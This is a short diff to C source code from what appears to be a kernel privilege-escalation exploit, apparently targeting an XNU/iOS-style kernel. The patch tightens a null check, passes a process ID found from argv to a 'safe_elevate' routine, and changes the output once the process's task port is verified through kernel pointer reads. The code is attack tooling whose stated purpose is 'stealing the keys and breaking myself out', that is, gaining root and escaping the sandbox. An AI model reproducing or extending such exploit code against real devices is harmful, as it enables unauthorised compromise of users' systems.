@@ -33,10 +33,10 @@ int initialize()
     }
 
     printf("\n");
-    return !(toolbox->initialised = (toolbox && toolbox->header && toolbox->commands && toolbox->offsets));
+    return !(toolbox && (toolbox->initialised = (toolbox && toolbox->header && toolbox->commands && toolbox->offsets)));
 }
 
-int main()
+int main(int argc, char **argv)
 {
     printf("\n[*] UID: %d, PID: %d\n", getuid(), getpid());
 
@@ -51,13 +51,13 @@ int main()
     printf("\n[*] Allproc: %llx, task_port: %llx", toolbox->allproc, toolbox->offsets->my_task_port);
 
     printf("\n[*] Stealing the keys and breaking myself out - ");
-    if (safe_elevate(toolbox, getpid()) || test_rw())
+    if (safe_elevate(toolbox, find_pid(toolbox, argv[0])) || test_rw())
         return 1;
 
-    printf((read_pointer(toolbox, read_pointer(toolbox, toolbox->offsets->my_task_port + __ip_kobject_offset) +
-                                      __bsd_info) == toolbox->offsets->my_proc)
-               ? "Yo! It worked!"
-               : "Huh? You got the wrong task_port my friend");
+    printf("\n%s", (read_pointer(toolbox, read_pointer(toolbox, toolbox->offsets->my_task_port + __ip_kobject_offset) +
+                                              __bsd_info) == toolbox->offsets->my_proc)
+                       ? "[*] task_port found"
+                       : "Huh? You got the wrong task_port my friend");
 
     return 0;
 }
